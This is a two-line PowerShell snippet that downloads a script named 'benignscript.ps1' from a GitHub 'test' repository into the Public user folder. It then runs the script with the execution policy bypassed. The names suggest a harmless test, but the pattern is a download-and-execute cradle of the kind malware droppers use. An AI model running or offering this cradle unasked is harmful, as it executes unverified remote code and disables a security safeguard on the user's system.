Invoke-WebRequest -Uri "https://raw.githubusercontent.com/jcresta10/test/main/benignscript.ps1" -OutFile "C:\Users\Public\benignscript.ps1"
powershell -ExecutionPolicy Bypass -File "C:\Users\Public\benignscript.ps1"
